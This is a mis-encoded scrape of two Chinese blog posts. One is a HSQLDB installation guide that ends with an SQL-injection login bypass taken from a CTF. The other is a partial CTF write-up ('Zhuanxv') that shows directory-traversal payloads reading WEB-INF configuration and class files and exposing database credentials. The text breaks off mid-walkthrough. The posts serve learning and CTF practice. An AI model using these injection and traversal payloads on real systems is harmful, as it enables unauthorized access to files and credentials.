æ•°æ®åº“è®¿é—®å·¥å…·ï¼Œä¹Ÿå¯ä»¥ä¸å…¶ä»–æ•°æ®åº“å¼•æ“ä¸€èµ·ä½¿ç”¨ã€‚ 0x03 HSQLDB å®‰è£… HSQLDB æ˜¯ä¸€ä¸ªç”¨çº¯ Java å®ç°çš„å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿã€‚æ‚¨å¯ä»¥ä½¿ç”¨ JDBC è½»æ¾åœ°å°†æ­¤æ•°æ®åº“åµŒå…¥åˆ°æ‚¨çš„åº”ç”¨ç¨‹åºä¸­ã€‚æˆ–è€…æ‚¨å¯ä»¥å•ç‹¬ä½¿ç”¨è¿™äº›æ“ä½œã€‚ 3.1 å…ˆå†³æ¡ä»¶ éµå¾ª HSQLDB çš„å¿…å¤‡è½¯ä»¶å®‰è£…ã€‚ 3.2 éªŒè¯ Java å®‰è£… ç”±äºHSQLDBæ˜¯çº¯Javaå®ç°çš„å…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼Œæ‰€ä»¥åœ¨å®‰è£…HSQLDBä¹‹å‰å¿…é¡»å…ˆå®‰è£…JDKï¼ˆJava Development Kitï¼‰è½¯ä»¶ã€‚å¦‚æœæ‚¨çš„ç³»ç»Ÿä¸­å·²ç»å®‰è£…äº† JDKï¼Œè¯·å°è¯•ä»¥ä¸‹å‘½ä»¤æ¥éªŒè¯ Java ç‰ˆæœ¬ã€‚ java â€“version å¦‚æœæ‚¨çš„ç³»ç»Ÿä¸­æˆåŠŸå®‰è£…äº† JDKï¼Œæ‚¨å°†è·å¾—ä»¥ä¸‹è¾“å‡ºã€‚ java version \"1.8.0_91\" Java(TM) SE Runtime Environment (build 1.8.0_91-b14) Java HotSpot(TM) 64-Bit Server VM (build 25.91-b14, mixed mode) å¦‚æœæ‚¨çš„ç³»ç»Ÿä¸­æ²¡æœ‰å®‰è£… JDKï¼Œè¯·è®¿é—®ä»¥ä¸‹é“¾æ¥ä»¥å®‰è£… JDKã€‚ 3.3 HSQLDB å®‰è£… ä»¥ä¸‹æ˜¯å®‰è£… HSQLDB çš„æ­¥éª¤ã€‚ æ­¥éª¤ 1 â€“ ä¸‹è½½ HSQLDB åŒ… ä»ä»¥ä¸‹é“¾æ¥https://sourceforge.net/projects/hsqldb/files/ä¸‹è½½æœ€æ–°ç‰ˆæœ¬çš„ HSQLDB æ•°æ®åº“ 3.4 å‡†å¤‡é©±åŠ¨ æ­¥éª¤ 2 â€“ è§£å‹ç¼© HSQLDB zip æ–‡ä»¶ è§£å‹ç¼© zip æ–‡ä»¶å¹¶å°†å…¶æ”¾å…¥C:\\ç›®å½•ï¼ˆä»»æ„ç›®å½•å‡å¯ï¼‰ è¿™é‡Œä¹Ÿæ˜¯åºŸäº†æˆ‘å¾ˆé•¿æ—¶é—´ï¼Œè¯•éªŒä¸‹æ¥ä¼¼ä¹åªæœ‰2.3.4ç‰ˆæœ¬çš„ç¨³å®šï¼Œå…¶ä»–ç‰ˆæœ¬çš„ä¸çŸ¥é“å¦‚ä½•å¯åŠ¨ï¼Œè€Œä¸”ä¹Ÿæ²¡æœ‰è¿‘å‡ å¹´å…³äºæ­¤hsqldbçš„ä»‹ç»æ–‡ç« äº†ã€‚éš¾å— æ­¥éª¤ 3 â€“ åˆ›å»ºé»˜è®¤æ•°æ®åº“ 1ã€ åœ¨dç›˜ä¸‹å»ºç«‹ä¸€ä¸ªç›®å½•hsqldbæ–‡ä»¶å¤¹ï¼ˆè¿™ä¸ªæ˜¯ä»»æ„å»ºç«‹çš„ï¼‰ï¼Œåœ¨æ–‡ä»¶å¤¹ä¸­åˆ›å»ºlibæ–‡ä»¶å¤¹ï¼Œå°†hsqldb-2.3.4è§£å‹åçš„libç›®å½•ä¸‹çš„hsqldb.jaræ‹·è´åˆ°é‡Œé¢ï¼Œç„¶ååœ¨hsqldbæ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªdataçš„æ–‡ä»¶å¤¹ã€‚ 3.5 å¯åŠ¨æœåŠ¡ 2ã€ åˆ›å»ºæ•°æ®åº“ è¿›å…¥å‘½ä»¤æç¤ºç¬¦ï¼Œè¿›å…¥dataæ–‡ä»¶å¤¹ï¼Œè¾“å…¥ä¸‹é¢çš„å‘½ä»¤ï¼š java -cp ../lib/hsqldb.jar org.hsqldb.Server -database test æˆåŠŸå¼€å¯ 3ã€ åœ¨dataæ–‡ä»¶å¤¹ä¸­å°±ä¼šå‡ºç°ä¸¤ä¸ªæ–‡ä»¶ï¼štest.logå’Œ test.propertiesï¼Œä¹Ÿå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªåç§°ä¸ºtestçš„æ•°æ®åº“ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ è¿™é‡Œä¸€ç›´åˆ°å¯åŠ¨æ•°æ®åº“é‚£é‡Œéƒ½å­˜åœ¨é—®é¢˜ï¼Œæˆ‘ä¸æ¸…æ¥šè¯¥æ•°æ®åº“çš„åˆ«åæ˜¯å•¥äº†ã€‚ã€‚ã€‚è§£å†³çš„è¯çœ‹åé¢ï¼ˆè·³è¿‡è¿™é‡Œï¼‰ 4ã€ ç„¶ååœ¨hsqldbçš„æ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸€ä¸ªmydbæ–‡ä»¶å¤¹ï¼Œåœ¨æ–‡ä»¶å¤¹ä¸­åˆ›å»ºä¸‰ä¸ªæ–‡ä»¶ï¼šrunManager.batï¼ŒrunManagerSwing.batå’ŒrunServer2.bat runManager.batå¯¹åº”çš„å†…å®¹ä¸ºï¼š cd ..\\data @java -classpath ..\\lib\\hsqldb.jar org.hsqldb.util.DatabaseManager runManagerSwing.batå¯¹åº”çš„å†…å®¹ä¸ºï¼š cd ..\\data @java -classpath ..\\lib\\hsqldb.jar org.hsqldb.util.DatabaseManagerSwing runServer2.batå¯¹åº”çš„å†…å®¹ä¸ºï¼š cd ..\\data @java -classpath ../lib/hsqldb.jar org.hsqldb.server.Server -port 9001 -database.0 file:../data/mydb -dbname.0 mydb 5ã€ è¿è¡Œhsqldb åŒå‡»runServer2.batæ–‡ä»¶ï¼Œæ­¤æ—¶å›å¼¹å‡ºå‘½ä»¤è¡Œçª—å£ï¼Œå¦‚ä¸‹å›¾ï¼Œè¡¨ç¤ºå·²å¯åŠ¨ HSQLDB æ•°æ®åº“ã€‚ è¿™é‡Œå¼¹ä¸€ä¸‹å°±æ²¡äº†ï¼Œæˆ‘æˆªä¸ä½å›¾ã€‚ã€‚ã€‚ã€‚ æ­¤æ—¶ï¼Œäº§ç”Ÿäº†ä¸‰ä¸ªæ–‡ä»¶ï¼Œå¦‚ï¼š test.lck â€”â€”æ ‡è¯†æ•°æ®åº“é”çŠ¶æ€ã€‚ test.log â€”â€”è¿è¡Œæ•°æ®åº“äº§ç”Ÿçš„logä¿¡æ¯ï¼Œå®ƒå°†è®°å½•æ¯ä¸€ä¸ªè¿è¡Œå’Œç”¨æˆ·æ“ä½œç¯èŠ‚ã€‚ test.propertiesâ€”â€”æ•°æ®åº“çš„é…ç½®ä¿¡æ¯ï¼ŒåŒ…æ‹¬åˆ†é…çš„å†…å­˜å¤§å°ç­‰ï¼Œå¯æ›´å…·éœ€è¦ä¿®æ”¹ã€‚ 3.6 è¿è¡Œæ¨¡å¼ æ•°æ®åº“å¼•æ“åˆ†4ç§å·¥ä½œæ¨¡å¼ï¼šå†…å­˜In-Memoryã€ç‹¬ç«‹Standaloneã€æœåŠ¡å™¨Serverã€éŸ¦ä¼¯æœåŠ¡å™¨WebServerï¼Œå¯åŠ¨æ–¹å¼å‚æ•°å¤§åŒå°å¼‚ï¼Œæœ¬æ–‡ä»¥ç¬¬ä¸‰ç§ä¸ºä¾‹ï¼› 4. ç®¡ç†HSQL å¯åŠ¨HSQLç®¡ç†å·¥å…·ï¼Œæ‰“å¼€å‘½ä»¤è¡Œçª—å£ï¼Œæ‰§è¡Œä¸‹åˆ—å‘½ä»¤ï¼š java -cp hsqldb.jar org.hsqldb.util.DatabaseManager å‡ºç°connectçª—å£ï¼š ä¸è¿‡è¿™é‡Œç›´æ¥åŒå‡»è¿è¡ŒrunManager.batå³å¯ Recentï¼šå°†ä¼šåˆ—å‡ºæœ€è¿‘çš„æ•°æ®åº“é…ç½® Setting Name: è®¾ç½®åç§°ï¼Œè¿™é‡Œä¸éœ€è¦å¡«å†™ Typeï¼šé€‰æ‹©æœåŠ¡å™¨æ¨¡å¼ï¼ˆHSQL Database Engine Serverï¼‰ Driverï¼šé©±åŠ¨åç§°ï¼Œä¸éœ€è¦ä¿®æ”¹ URLï¼šJDBCè¿æ¥ï¼Œæ— éœ€ä¿®æ”¹ Userï¼šç”¨æˆ·å,æ ¹æ®éœ€è¦è®¾ç½® Passwordï¼šå¯†ç ï¼Œæ ¹æ®éœ€è¦è®¾ç½® åœ¨å‘½ä»¤è¡Œæ¨¡å¼ä¸‹å¯åŠ¨HSQLæœåŠ¡å™¨æ¨¡å¼ï¼š java -cp ../lib/hsqldb.jar org.hsqldb.Server -database.0 db -dbname.0 db â€‹ å‘½ä»¤ä¸­çš„org.hsqldb.Server -database.0ä¸-dbname.0ä¸ºå›ºå®šå€¼ï¼Œdb ä¸ºæ•°æ®åº“åˆ«åï¼Œå¦‚æœè¯¥åº“å­˜åœ¨ï¼Œåˆ™æ‰“å¼€è¯¥åº“ï¼Œä¸å­˜åœ¨ï¼Œåˆ™æ–°å»ºå¹¶æ‰“å¼€ã€‚ java -cp ../lib/hsqldb.jar org.hsqldb.util.DatabaseManager ä¸Šè¿°å‘½ä»¤ä¼šå¯åŠ¨æœåŠ¡ é€‰æ‹©å¼•æ“Typeï¼šHSQL Database Engine Serveræ¨¡å¼ï¼Œä¿®æ”¹URLï¼šjdbc:hsqldb:hsql://localhost/dbï¼Œdbä¸ºæ­¥éª¤ä¸‰ä¸­æŒ‡å®šçš„æ•°æ®åº“åˆ«åï¼Œç”¨æˆ·åSAï¼Œå¯†ç ä¸ºç©ºï¼Œç™»å½•ã€‚ 3.7 æ‰§è¡ŒSQL ç™»å½•æˆåŠŸåï¼Œå·¥ä½œå°å¦‚å›¾æ‰€ç¤ºï¼Œç•Œé¢ç®€å•çš„åƒæ˜¯Demoï¼å·¦ä¾§ä¸ºæ•°æ®åº“çš„æ‰€æœ‰è¡¨æ ‘å›¾ï¼Œå³ä¸Šä¾§ä¸ºSQLç¼–è¾‘åŒºï¼š è¾“å…¥SQLè¯­å¥ï¼Œç‚¹å‡»å³ä¾§Executeæ‰§è¡Œ åœ¨è¿™é‡Œå¤§å°å†™å‡å¯ï¼Œä¸è¿‡è¿˜æ˜¯æ¨èå¤§å†™ è·å¾—HSQLè¯­æ³•å¸®åŠ©ï¼Œç‚¹å‡»èœå•Command â€”â€”&gt; CREATE TABLE ï¼š HSQL SELECTè¯­æ³•ï¼š HSQLç¯å¢ƒå˜é‡ï¼š 3.7 å…³é—­HSQL åœ¨SQLç¼–è¾‘åŒºè¾“å…¥shutdownå‘½ä»¤ï¼Œå•å‡»Executeæ‰§è¡Œï¼š æœåŠ¡å™¨å“åº”å¦‚ä¸‹ï¼š 0x04 è¿›ä¸€æ­¥ç†Ÿæ‚‰ å›é¡¾ä¹‹å‰åšçš„ctfé¢˜ç›®ï¼Œå…¶ä¸­ä¸€ä¸ªsqlè¯­å¥æ˜¯è¿™æ ·å†™çš„ public List&lt;User&gt; loginCheck(String name, String password) { return this.getHibernateTemplate().find(\"from User where name ='\" + name + \"' and password = '\" + password + \"'\"); } è€Œä½¬æ˜¯è¿™æ ·ç»•è¿‡çš„ï¼š from User where name ='admin' or '1'&gt;'0' or name like 'admin' and password = '\" + password + \"' è¿™æ ·çš„è¯ä»–æ˜¯è¿™æ ·ä¼ å‚çš„ ç”¨æˆ·åï¼š admin' or '1'&gt;'0' or name like 'admin è¿™é‡Œå‘¢ï¼Œå‰é¢çš„ç¬¬ä¸€ä¸ªå•å¼•å·æ˜¯ä¸ºäº†é—­åˆwhere name='ä¸­çš„å•å¼•å· åé¢çš„ç”¨oréš”å¼€ï¼Œæ¥ç€æ˜¯â€™1â€™ &gt; â€˜0â€™ï¼Œå¾ˆæ˜æ˜¾æ’ä¸ºtrueï¼Œæ¥ç€åœ¨oréš”å¼€name like 'adminï¼Œè¿™é‡Œçš„å•å¼•å·ç”¨æ¥é—­åˆname ='\" + name + \"'ä¸­çš„æœ€åçš„å•å¼•å·ã€‚ç”±äº1&gt;0ä¸ºtrueï¼Œé‚£ä¹ˆè¿™æ•´æ¡è¯­å¥å°±ä¸ºtrueï¼Œä¹Ÿå°±ä¸éœ€è¦å…³å¿ƒå¯†ç æ˜¯å¤šå°‘äº†ã€‚ è‡³äºä¸ºä½•è¦1&gt;0è€Œä¸ç”¨1=1ï¼Œæ˜¯å› ä¸ºé¢˜ç›®è¿‡æ»¤äº†ç­‰äºå· è‡³äºä¸ºä»€ä¹ˆæ˜¯è¦ç”¨ä¸¤ä¸ªorï¼Œæ˜¯å› ä¸ºï¼Œmysqlé‡Œandä¼˜å…ˆçº§æ¯”oré«˜ é‚£ä¹ˆä¸¤ä¸ªorçš„ä½œç”¨æ˜¯ä¿è¯æ°¸çœŸï¼Œç®€å•ä¸¾ä¸ªä¾‹ï¼Œä¸€ä¸ªor:adminâ€™ or â€˜1â€™&gt;â€˜0â€™ and password=1 è¡¨ç¤ºä¸ºfalse or true and falseï¼Œå…ˆæ‰§è¡Œtrue and falseï¼Œ ä¸ºfalseå†æœ‰false or falseé‚£å°±æ˜¯falseï¼Œè€Œä¸¤ä¸ªfalse or true or true and falseæ˜¯trueï¼Œå› æ­¤æ ¹æ®è¿™ä¸ªé€»è¾‘ï¼Œå¯ä»¥è¿›è¡Œç›²æ³¨ ä½†ä¸ç†è§£çš„æ˜¯ä»–ä»¬æ˜¯å¦‚ä½•çŸ¥é“æ•°æ®åº“ä¸€å®šå«æœ‰adminçš„ç”¨æˆ·çš„ã€‚ã€‚ã€‚å¯èƒ½æ˜¯çŒœæµ‹ä¸€èˆ¬rootç”¨æˆ·éƒ½æ˜¯adminå§ã€‚ã€‚ã€‚ 0x04 æ€»ç»“ æ€»ä¹‹è¿™ä¸ªHSQLä¸mysqlå¾ˆç±»ä¼¼ï¼ŒHSQLæ•°æ®åº“æœ‰å¦‚ä¸‹ä¸¤ä¸ªç‰¹ç‚¹ï¼š ä¸€æ˜¯â€œçº¯è€Œç²¾â€ï¼Œå®ƒæ˜¯ä¸€æ¬¾ç”±HSQL Development Groupå¼€å‘çš„çº¯Javaæ•°æ®åº“ï¼Œéµå¾ªBSD-styleè®¸å¯åè®®ï¼Œæ”¯æŒSQL99ï¼ŒSQL2003å¤§éƒ¨åˆ†è¯­æ³•æ ‡å‡†ï¼› äºŒæ˜¯â€œå°è€Œè½»â€ï¼Œæ›´ä¸ºé‡è¦çš„æ˜¯ï¼Œè¯¥æ•°æ®åº“ä½“ç§¯è´¼å°ï¼Œæ•°æ®åº“å¼•æ“ã€JDBCé©±åŠ¨ä¸ç®¡ç†å·¥å…·ä¸‰åˆä¸€åŠ èµ·æ¥æ‰600å¤šKbï¼ŒJBossã€Kettle3.0åŠä»¥ä¸Šã€DataX ç­‰å¤§å¤šæ•°å·¥å…·æˆ–ä¸­é—´ä»¶é»˜è®¤éƒ½æ”¯æŒHSQLã€‚ å‚è€ƒæ–‡ç«  hsqldbçš„å®‰è£…ä½¿ç”¨ HSQLDBæ•™ç¨‹ HSQL æ•°æ®åº“å…¥é—¨","tags":["åŸºæœ¬çŸ¥è¯†"],"categories":["webçŸ¥è¯†æ€»ç»“"]},{"title":"Zhuanxv","path":"/2023/10/03/zhuanxv/","content":"é¢˜ç›®æè¿° ä½ åªæ˜¯åœ¨æ‰«æç›®æ ‡ç«¯å£çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªå¼€æ”¾çš„webæœåŠ¡ é¢˜ç›®è§£é¢˜ æ‰“å¼€é¦–é¡µå¦‚ä¸Šå›¾ï¼ŒæŸ¥æ‰¾ä¸€ç•ªæ²¡ä»€ä¹ˆä¿¡æ¯ï¼Œç›´æ¥æ‰”ç»™dirsearchæ‰«ä¸€ä¸‹ï¼Œç»“æœæ‰«å‡ºæ¥ä¸ªlistï¼Œæ·»åŠ åˆ°urlåè‡ªåŠ¨è·³è½¬åˆ°ä¸€ä¸ªç™»å½•é¡µé¢ã€‚ ä¹‹åæµ‹è¯•äº†å‡ ç•ªXSSã€sqlæ³¨å…¥ï¼Œå¼±å£ä»¤ä½†æ²¡ä»€ä¹ˆæ•ˆæœï¼Œéšåå°±æ²¡æ€è·¯äº†ï¼Œä¹‹åç½‘ä¸Šæ¼«æ¸¸çœ‹åˆ°äº†ä¸€ç‚¹æ€è·¯ï¼Œäºæ˜¯æ¥ç€å¼€å§‹å°è¯•ï¼Œæ®ä»–çš„æ€è·¯è¿›å…¥è¿™é‡Œä¹Ÿå¯ä»¥åœ¨æŠ“åŒ…ä¹‹åå°è¯•forwardæ”¾åŒ…çœ‹çœ‹æœ‰ä»€ä¹ˆæ•æ„Ÿä¿¡æ¯ï¼Œäºæ˜¯ä¹æˆ‘æ”¾åŒ…çœ‹åˆ°å¦‚ä¸‹ å‘ç°è¿™é‡ŒåŠ è½½äº†å›¾ç‰‡ï¼Œå› ä¸ºä¸æ˜¯å’±ä»¬ä¸Šä¼ çš„ï¼Œé‚£è‚¯å®šæ˜¯åç«¯æœåŠ¡å™¨åŠ è½½çš„å˜›ã€‚äºæ˜¯ä¹æˆ‘ä»¬å¯ä»¥å°è¯•åœ¨æ­¤urlä¸Šè¯»å–ä¸€äº›æ•æ„Ÿä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯è¿›è¡Œç›®å½•éå†ï¼Œç„¶åæˆ‘åˆæ¥ç€å°è¯•è¯»å–ï¼Œä½†é¡µé¢è™½ç„¶è¿”å›200ï¼Œä½†è¿˜æ˜¯æ²¡æœ‰ä¿¡æ¯ã€‚æ— å¥ˆå†å»çœ‹wpï¼Œå‘ç°æ˜¯è·¯å¾„çš„é”™è¯¯ï¼Œä»–æ˜¯è¿™æ ·è¯»å–çš„ï¼š ?fileName=../../WEB-INF/web.xml æ¥ç€ä»–è§£é‡Šäº†ä¸ºä½•web.xmlåœ¨æ­¤å¤„ï¼šè¿™æ˜¯å› ä¸ºå†™webé¡¹ç›®çš„æ—¶å€™æœ‰å±‚çº§è¦æ±‚ï¼Œä¸€èˆ¬æ•ˆæœå¦‚å›¾ï¼š staticç›®å½•ä¸€èˆ¬æ”¾ç½®èµ„æºç­‰ï¼Œå›¾ç‰‡ã€æ–‡æœ¬ç­‰ï¼Œä¸€èˆ¬ä¸Šä¸Šçº§çš„WEB-INFä¼šæ”¾é…ç½®æ–‡ä»¶ï¼Œå¦‚å›¾ï¼š éšåæˆ‘ä»¬è®¿é—®ä¸€ä¸‹å‘ç°å¦‚å›¾ï¼Œæ˜¯ä¸€ä¸ªä¸‹è½½çš„bg.jpgå›¾ç‰‡ è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°å›¾ç‰‡ä¸­å«æœ‰struts2æ¡†æ¶ï¼Œä½†æˆ‘ä¹Ÿä¸ç†Ÿæ‚‰ï¼Œåªèƒ½è·Ÿç€wpèµ°äº†ã€‚â”­â”®ï¹â”­â”® å¯ä»¥çœ‹åˆ°ï¼Œè¯¥é¡¹ç›®ä½¿ç”¨çš„struts2æ¡†æ¶ï¼ˆä¸«çš„è€æ‰ç‰™äº†ï¼‰ï¼Œstruts.xmlæ˜¯struts2çš„æ ¸å¿ƒé…ç½®æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶ä¸»è¦è´Ÿè´£ç®¡ç†åº”ç”¨ä¸­çš„Actionæ˜ å°„ï¼Œä»¥åŠè¯¥ActionåŒ…å«çš„Resultå®šä¹‰ç­‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è¯»å–struts.xmlçœ‹çœ‹ï¼Œæ„é€ payloadï¼š /loadimage?fileName=../../WEB-INF/classes/struts.xml å¦‚å›¾å‘ç°å«æœ‰struct2-2.3.dtdï¼Œæˆ‘è¿™é‡ŒçŒœæµ‹ç‰ˆæœ¬æ˜¯2.3ï¼Œåº”è¯¥å¯ä»¥åˆ©ç”¨çˆ†å‡ºçš„æ¼æ´pocæ¥è§£ å†…å®¹å¦‚ä¸‹ï¼š &lt;?xml versinotallow=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE struts PUBLIC \"-//Apache Software Foundation//DTD Struts Configuration 2.3//EN\" \"http://struts.apache.org/dtds/struts-2.3.dtd\"&gt; &lt;struts&gt; &lt;constant name=\"strutsenableDynamicMethodInvocation\" value=\"false\"/&gt; &lt;constant name=\"struts.mapper.alwaysSelectFullNamespace\" value=\"true\" /&gt; &lt;constant name=\"struts.action.extension\" value=\",\"/&gt; &lt;package name=\"front\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;global-exception-mappings&gt; &lt;exception-mapping exception=\"java.lang.Exception\" result=\"error\"/&gt; &lt;/global-exception-mappings&gt; &lt;action name=\"zhuanxvlogin\" class=\"com.cuitctf.action.UserLoginAction\" method=\"execute\"&gt; &lt;result name=\"error\"&gt;/ctfpage/login.jsp&lt;/result&gt; &lt;result name=\"success\"&gt;/ctfpage/welcome.jsp&lt;/result&gt; &lt;/action&gt; &lt;action name=\"loadimage\" class=\"com.cuitctf.action.DownloadAction\"&gt; &lt;result name=\"success\" type=\"stream\"&gt; &lt;param name=\"contentType\"&gt;image/jpeg&lt;/param&gt; &lt;param name=\"contentDisposition\"&gt;attachment;filename=\"bg.jpg\"&lt;/param&gt; &lt;param name=\"inputName\"&gt;downloadFile&lt;/param&gt; &lt;/result&gt; &lt;result name=\"suffix_error\"&gt;/ctfpage/welcome.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt; &lt;package name=\"back\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;interceptors&gt; &lt;interceptor name=\"oa\" class=\"com.cuitctf.util.UserOAuth\"/&gt; &lt;interceptor-stack name=\"userAuth\"&gt; &lt;interceptor-ref name=\"defaultStack\" /&gt; &lt;interceptor-ref name=\"oa\" /&gt; &lt;/interceptor-stack&gt; &lt;/interceptors&gt; &lt;action name=\"list\" class=\"com.cuitctf.action.AdminAction\" method=\"execute\"&gt; &lt;interceptor-ref name=\"userAuth\"&gt; &lt;param name=\"excludeMethods\"&gt; execute &lt;/param&gt; &lt;/interceptor-ref&gt; &lt;result name=\"login_error\"&gt;/ctfpage/login.jsp&lt;/result&gt; &lt;result name=\"list_error\"&gt;/ctfpage/welcome.jsp&lt;/result&gt; &lt;result name=\"success\"&gt;/ctfpage/welcome.jsp&lt;/result&gt; &lt;/action&gt; &lt;/package&gt; &lt;/struts&gt; å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šurlåœ°å€ï¼Œä¹‹åæ˜¯wpçš„è®²è§£ï¼š å¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šclassï¼Œè¿™å°±æ˜¯æ‰€è°“çš„æ˜ å°„æ–‡ä»¶ï¼Œå¦‚è¡¨ç¤ºè®¿é—®loadimageè·¯å¾„æ—¶å€™ï¼Œä¼šå»æ‰¾å­—èŠ‚ç com.cuitctf.action.DownloadActionæ–‡ä»¶å»åŠ è½½å†…å®¹ï¼Œæˆ‘ä»¬ä¸€ä¸€æ„é€ payloadï¼š loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/UserLoginAction.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/DownloadAction.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/action/AdminAction.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/util/UserOAuth.class ä¸‹è½½ä¸‹æ¥åè¯·è®°å¾—ä¿®æ”¹æ–‡ä»¶åç§°.classï¼Œè¿›è¡Œåç¼–è¯‘å¼€å§‹ä»£ç å®¡è®¡ ä¸Šå›¾æ˜¯ç”¨ideaæ‰“å¼€è¿›è¡Œåç¼–è¯‘ï¼Œçœ‹äº†ä¸€ç•ªå‘ç°userloginæ–‡ä»¶æ¯”è¾ƒå¯ç–‘ å¦‚å›¾å‘ç°å­˜åœ¨ctfä»€ä¹ˆçš„åŒ…ï¼Œé‚£æˆ‘ä»¬æ„é€ urlè®¿é—®ä¸€ä¸‹çœ‹çœ‹ loadimage?fileName=../../WEB-INF/classes/com/cuitctf/po/User.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/UserService.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/util/InitApplicationContext.class User.classåç¼–è¯‘åæ˜¯ä¸€ä¸ªBeanæ–‡ä»¶ï¼ŒUserLoginAction.classåç¼–è¯‘åæ˜¯ç™»å½•éªŒè¯é€»è¾‘æ–‡ä»¶ï¼ŒInitApplicationContext.classåç¼–è¯‘åæ˜¯ç±»åŠ è½½å™¨æ–‡ä»¶ã€‚ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒåŠ è½½åº”ç”¨çš„xmlé…ç½®æ–‡ä»¶ä¸ºapplicationContext.xmlï¼Œè¯¥æ–‡ä»¶ä¸€èˆ¬æ˜¯é¡¹ç›®çš„å¯åŠ¨é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬æ•°æ®åº“ç­‰ï¼ŒåŒæ ·æ„é€ payloadï¼Œå¦‚ä¸‹ï¼š loadimage?fileName=../../WEB-INF/classes/applicationContext.xml ä¸‹è½½åæºç å¦‚ä¸‹ï¼š &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"dataSource\" class=\"org.springframework.jdbc.datasource.DriverManagerDataSource\"&gt; &lt;property name=\"driverClassName\"&gt; &lt;value&gt;com.mysql.jdbc.Driver&lt;/value&gt; &lt;/property&gt; &lt;property name=\"url\"&gt; &lt;value&gt;jdbc:mysql://localhost:3306/sctf&lt;/value&gt; &lt;/property&gt; &lt;property name=\"username\" value=\"root\"/&gt; //æ•°æ®åº“è´¦å·å¯†ç  &lt;property name=\"password\" value=\"root\" /&gt; &lt;/bean&gt; &lt;bean id=\"sessionFactory\" class=\"org.springframework.orm.hibernate3.LocalSessionFactoryBean\"&gt; &lt;property name=\"dataSource\"&gt; &lt;ref bean=\"dataSource\"/&gt; &lt;/property&gt; &lt;property name=\"mappingLocations\"&gt; &lt;value&gt;user.hbm.xml&lt;/value&gt; &lt;/property&gt; &lt;property name=\"hibernateProperties\"&gt; &lt;props&gt; &lt;prop key=\"hibernate.dialect\"&gt;org.hibernate.dialect.MySQLDialect&lt;/prop&gt; &lt;prop key=\"hibernate.show_sql\"&gt;true&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"hibernateTemplate\" class=\"org.springframework.orm.hibernate3.HibernateTemplate\"&gt; &lt;property name=\"sessionFactory\"&gt; &lt;ref bean=\"sessionFactory\"/&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"transactionManager\" class=\"org.springframework.orm.hibernate3.HibernateTransactionManager\"&gt; &lt;property name=\"sessionFactory\"&gt; &lt;ref bean=\"sessionFactory\"/&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"service\" class=\"org.springframework.transaction.interceptor.TransactionProxyFactoryBean\" abstract=\"true\"&gt; &lt;property name=\"transactionManager\"&gt; &lt;ref bean=\"transactionManager\"/&gt; &lt;/property&gt; &lt;property name=\"transactionAttributes\"&gt; &lt;props&gt; &lt;prop key=\"add\"&gt;PROPAGATION_REQUIRED&lt;/prop&gt; &lt;prop key=\"find*\"&gt;PROPAGATION_REQUIRED,readOnly&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"userDAO\" class=\"com.cuitctf.dao.impl.UserDaoImpl\"&gt; &lt;property name=\"hibernateTemplate\"&gt; &lt;ref bean=\"hibernateTemplate\"/&gt; &lt;/property&gt; &lt;/bean&gt; &lt;bean id=\"userService\" class=\"com.cuitctf.service.impl.UserServiceImpl\"&gt; &lt;property name=\"userDao\"&gt; &lt;ref bean=\"userDAO\"/&gt; &lt;/property&gt; &lt;/bean&gt; &lt;/beans&gt; å…¶ä¸­æš´éœ²äº†ä½¿ç”¨çš„æ•°æ®åº“ï¼Œæ•°æ®åº“è´¦å·å¯†ç ï¼Œä¸”å…¶ä¸­åŒ…å«äº†user.hbm.xmlç­‰é…ç½®æ–‡ä»¶ï¼ŒåŒæ ·æˆ‘ä»¬å°†å…¶ä¸‹è½½å‡ºæ¥ï¼š loadimage?fileName=../../WEB-INF/classes/user.hbm.xml loadimage?fileName=../../WEB-INF/classes/com/cuitctf/service/impl/UserServiceImpl.class loadimage?fileName=../../WEB-INF/classes/com/cuitctf/dao/impl/UserDaoImpl.class å¯ä»¥çœ‹åˆ°user.hbm.xmlæš—ç¤ºäº†flagåœ¨æ•°æ®åº“ä¸­ä½ç½®ï¼Œå¦‚å›¾ï¼š çœ‹åˆ°tableè¡¨ç¤ºè¡¨åï¼Œcolumnè¡¨ç¤ºåˆ—å UserServiceImpl.classåç¼–è¯‘åï¼Œæ˜¯å¯¹ç™»å½•ä¿¡æ¯è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¦‚å›¾ï¼š UserDaoImpl.classåç¼–è¯‘åï¼Œæ˜¯å¯¹ç™»å½•çš„sqlæŸ¥æ‰¾ï¼Œå¦‚å›¾ï¼š 